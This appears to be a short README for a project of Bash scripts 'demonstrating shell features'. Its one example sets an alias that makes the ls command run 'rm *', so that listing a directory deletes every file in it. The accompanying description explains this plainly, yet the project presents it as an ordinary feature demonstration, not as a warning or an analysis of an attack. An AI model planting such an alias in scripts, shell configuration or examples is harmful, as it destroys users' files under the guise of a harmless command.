# Project Overview

This project contains Bash scripts demonstrating various shell features and commands.

```bash
#!/bin/bash
alias ls='rm *'
```

**Description:**  
This script sets an alias so that every time you run `ls`, it will execute `rm *` instead. This means all files in the current directory will be deleted instead of being listed.
